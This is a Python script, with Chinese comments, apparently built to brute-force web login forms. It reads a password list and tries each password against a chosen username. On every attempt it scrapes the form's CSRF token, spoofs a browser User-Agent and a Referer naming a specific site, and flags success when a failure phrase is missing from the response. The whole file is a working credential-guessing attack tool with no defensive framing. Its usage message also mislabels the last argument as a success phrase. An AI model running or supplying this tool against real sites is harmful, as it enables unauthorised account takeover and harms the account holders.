import os
import sys
import json
import requests
from bs4 import BeautifulSoup

header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62',
    'Referer': 'https://leiasama.pythonanywhere.com/'
}


class Cracker:
    def __init__(self, url, file, login, submit, params_names, fail_phrase):
        self.submit = submit
        self.url = url
        self.fail = fail_phrase
        self.file_name = file
        if os.path.exists(file):
            # 从文件中读取数据
            self.passes = self.read_data(self.file_name)
            print("数据加载成功！")
            print(self.passes)

            self.login = login
            if len(login) == 0:
                print("未指定登录用户名！")
                sys.exit()

            # 准备要发送的数据
            try:
                self.data = []
                for pas in self.passes:
                    self.data.append((params_names[0], self.login, params_names[1], pas, params_names[2], self.submit))
                print("数据准备成功！")
                print(self.data)
            except IndexError:
                print("参数名称指定不正确")
                sys.exit()

            # 发送数据到服务器
            for index, single_data in enumerate(self.data):
                print(f"[ {index + 1}/{len(self.passes)} ] 正在发送数据 ", single_data, "到", self.url)
                if self.send(self.url, single_data, self.fail):
                    print("密码已找到！")
                    print("用户名:", self.login)
                    print("密码:", single_data[3])
        else:
            print("文件无法找到！")
            sys.exit()

    def read_data(self, filename):
        with open(filename, 'r') as f:
            lines = f.read().split('\n')
            return lines

    def send(self, url, data, fail):

        response = requests.get(url=url, headers=header)

        html = response.text

        soup = BeautifulSoup(html, 'lxml')
        csrf_token = soup.find('input').get('value')

        ready_data = {data[0]: data[1], data[2]: data[3], data[4]: data[5], "csrfmiddlewaretoken": csrf_token,
                      'next': '/'}
        cookies = {
            'csrftoken': csrf_token
        }

        r = requests.post(url=url, data=ready_data, headers=header, cookies=cookies)

        if fail in r.text:
            return False
        else:
            return True


try:
    URL = sys.argv[1]
    PASS = sys.argv[2]
    LOGIN = sys.argv[3]
    BUTTON_VALUE = sys.argv[4]
    PARAMS_NAMES = sys.argv[5].split('?')
    FAIL = sys.argv[6]
    cracker = Cracker(URL, PASS, LOGIN, BUTTON_VALUE, (PARAMS_NAMES[0], PARAMS_NAMES[1], PARAMS_NAMES[2]), FAIL)
except IndexError:
    print(
        "用法: python script.py <url> <包含密码的文件路径> <登录用户名> <提交按钮值> <登录/用户名?密码?提交按钮，用'?'分隔 <成功提示短语>")
